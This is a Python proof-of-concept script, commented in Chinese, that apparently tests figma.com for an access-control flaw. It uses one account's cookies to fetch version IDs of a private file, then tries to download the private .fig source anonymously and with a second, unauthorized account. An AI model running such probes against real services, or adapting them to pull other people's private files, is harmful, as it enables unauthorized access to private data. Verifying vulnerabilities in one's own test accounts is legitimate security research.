# -*- coding: utf-8 -*-
"""核心验证: A 私有化 make 文件的 .fig 匿名下载
1. A cookie 调 versions 拿 version_id (owner 权限)
2. 匿名 /version/{id}/canvas?fk=&fv=0 -> 若 200/302 => 私有文件源文件泄露
3. 交叉验证: fk 换成其他文件是否仍可下
"""
import io, json, sys, urllib.error, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
AC = io.open('ws_cookie_A_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')


def call(label, url, cookie=None, method="GET", follow=False):
    headers = {"User-Agent": UA, "Accept": "application/json"}
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(url, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r:
            raw = r.read()
            loc = r.headers.get("Location")
            print(f"[{label}] HTTP {r.status} len={len(raw)} type={r.headers.get('Content-Type')} loc={str(loc)[:100]}")
            if loc:
                return r.status, loc
            return r.status, raw.decode(errors='replace')
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} :: {raw[:200]}")
        return e.code, raw


print("===== 1. A versions: 私有 make 文件 (owner) =====")
st, raw = call("A versions", f"{BASE}/api/versions/{A_MAKE}?page_size=10", cookie=AC)
vid = None
if st == 200:
    try:
        d = json.loads(raw)
        vs = d["meta"]["versions"]
        print(f"  -> {len(vs)} versions")
        for v in vs[:3]:
            print("   ", v["id"], "|", v.get("created_at"), "|", (v.get("canvas_path") or "")[:60])
        if vs:
            vid = vs[0]["id"]
    except Exception as e:
        print("  parse err", e)

print("\n===== 2. 匿名 canvas 下载私有文件 .fig (核心) =====")
if vid:
    call("anon canvas", f"{BASE}/version/{vid}/canvas?fk={A_MAKE}&fv=0")
    print("\n===== 3. 匿名直接下载签名 URL =====")
    st, loc = call("anon canvas loc", f"{BASE}/version/{vid}/canvas?fk={A_MAKE}&fv=0")
    if st == 302 or (isinstance(loc, str) and loc.startswith("http")):
        call("anon s3 dl", loc)
        # 带 B cookie 试同一 URL (无权限账号)
        call("B s3 dl", loc, cookie=io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; '))
    print("\n===== 4. 对照: A cookie 下载 (owner 基线) =====")
    call("A canvas", f"{BASE}/version/{vid}/canvas?fk={A_MAKE}&fv=0", cookie=AC)
else:
    print("  无 version_id")
